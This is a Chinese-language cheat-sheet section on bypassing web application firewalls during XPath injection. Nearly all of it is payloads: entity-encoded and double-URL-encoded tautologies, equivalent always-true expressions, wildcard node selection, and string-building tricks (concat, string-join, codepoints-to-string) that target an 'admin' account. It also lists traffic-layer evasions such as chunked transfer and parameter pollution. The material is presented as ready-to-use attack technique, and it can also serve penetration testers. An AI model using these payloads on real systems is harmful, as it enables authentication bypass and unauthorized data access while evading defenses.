## 十、WAF绕过

### 10.1 编码绕过
```
# XML/HTML实体编码（WAF未解码即匹配失败）
' or &#97;='a          # 十进制
' or &#x61;='a         # 十六进制
&apos;                  # XML实体' 
&quot;                  # XML实体"
' or &#x31;&#x3d;&#x31; or '   # '1'='1整体编码

# URL双重编码（%2527）
'%2527%2520or%25201%253d1%2520or%2520%2527
```

### 10.2 等价表达式（语义等价，特征不同）
```
' or 1=1 or '           # 数值永真
' or true() or '        # 函数永真
' or 'a'='a or '        # 字符串永真
' or not(not(//user)) or '      # 双重否定
' or count(//user)>0 or '       # 计数判断
' or 'a'=translate('b','b','a') or '   # translate构造
' or 'a'=concat('','a') or '
' or '1' eq '1' or '    # XPath 2.0 eq运算符
' or (//user) or '      # 节点集转布尔（存在即真）
```

### 10.3 词法/空白绕过
```
# XPath词法允许token间任意空白（空格/TAB/换行），可打散关键字
' or '1' = '1' or '
' or '1' = '1' or '
# 注意：XPath标准无注释语法（/**/为SQL专属），勿在XPath中使用

# 通配符/局部名绕过节点名过滤
/*[starts-with(name(),'u')]            # user节点
//*[contains(text(),'admin')]          # 任意文本含admin
/*[local-name()='users']/*[local-name()='user']   # 忽略命名空间
```

### 10.4 字符串过滤绕过（防"单引号"被滤）
```
# concat拼接（XPath 1.0/2.0）
' or //user[username=concat('ad','min')] or '

# 逐字符数组拼接（2.0）
' or //user[username=string-join(('a','d','m','i','n'),'')] or '

# codepoints-to-string（2.0，对数字/WAF最友好）
' or //user[username=codepoints-to-string(97,100,109,105,110)] or '

# translate变体（1.0可用）
' or //user[username=translate('xxxadminxxx','x','')] or '
```

### 10.5 流量层绕过
- Content-Type混淆（`application/json`、`multipart/form-data`包裹、`text/plain`）
- 分块传输（chunked）拆分关键字
- 双层编码（应用先decode再拼查询）
- HTTPS/Gzip压缩传输，WAF不解压
- 参数污染（HPP）：同一参数多次出现，WAF看一个应用取另一个

